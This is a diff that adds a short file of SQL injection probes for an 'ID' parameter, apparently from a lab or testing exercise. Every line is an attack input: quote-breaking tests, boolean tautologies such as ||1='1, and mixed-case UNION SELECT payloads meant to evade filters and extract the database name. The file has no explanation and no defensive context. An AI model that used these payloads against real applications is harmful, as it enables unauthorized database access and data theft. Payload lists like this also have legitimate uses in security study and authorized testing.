@@ -1,0 +1,29 @@
+ID:1
+ID:1'
+ID:1
+ID:0'
+ID:1
+ID:0
+ID:1'||1='1
+ID:0'unIOn SeLEct 1,database(),3||1='1
+ID:0')unIOn SeLEct 1,database(),3||1=('1
+ID:0'unIOn sELeCt1,2,'3
+ID:0')unIOn sELeCt1,2,('3
+ID:0"unIOn sELeCt1,2,"3
+ID:0"unIOn sELeCt1,2,"3
+ID:1'||1='1
+ID:1'&&1='1
+ID:1'||1='0
+ID:1'||1='1
+ID:1'&&1='1
+ID:1'&&1='0
+ID:0
+ID:1
+ID:12
+ID:12&&1=1
+ID:0&&1=1
+ID:12&&1=1
+ID:12&&1=0
+ID:1
+ID:0' unIOn SeLeCT 1,database(),3||1='1
+ID:0" unIOn SeLeCT 1,database(),3||1="1
